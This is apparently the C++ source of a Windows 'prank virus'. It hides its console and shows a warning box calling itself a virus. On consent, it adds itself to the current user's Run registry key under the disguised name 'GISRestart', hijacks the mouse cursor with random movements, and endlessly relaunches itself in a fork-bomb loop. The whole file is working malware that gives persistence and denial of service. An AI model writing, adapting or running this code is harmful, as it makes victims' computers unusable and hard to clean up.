#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include<string>
#include<Windows.h>
#include<thread>
#include<tchar.h>
using namespace std;
int x = GetSystemMetrics(SM_CXSCREEN);
int y = GetSystemMetrics(SM_CYSCREEN);
DWORD WINAPI mouse(LPVOID lpParameter)
{
    srand(time(0));
    while (1)
    {
        SetCursorPos(rand() % x, rand() % y);
    }
    return 0L;
}
int main(int argc, char** argv)
{
    HWND hWnd = GetConsoleWindow();
    SetWindowLong(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
    hWnd = FindWindow(L"ConsoleWindowClass", NULL);
    if (hWnd)
    {
        ShowWindow(hWnd, SW_HIDE);
    }
    if (MessageBox(0, L"本程序是病毒，是否打开？如打开，后果自负！", L"WARNING", MB_YESNO | MB_ICONWARNING) == 6)
    {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)  
        {
            TCHAR strExeFullDir[MAX_PATH];
            GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
            TCHAR strDir[MAX_PATH] = {};
            DWORD nLength = MAX_PATH;
            long result = RegGetValue(hKey, nullptr, _T("GISRestart"), RRF_RT_REG_SZ, 0, strDir, &nLength);
            if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
            {
                RegSetValueEx(hKey, _T("GISRestart"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR));
                RegCloseKey(hKey);
            }
        }
        HANDLE hThread = CreateThread(NULL, 0, mouse, NULL, 0, NULL);
        CloseHandle(hThread);
        while (1)
        {
            char s[100] = "start ";
            system(strcat(s, argv[0]));
        }
    }
    return 0;
}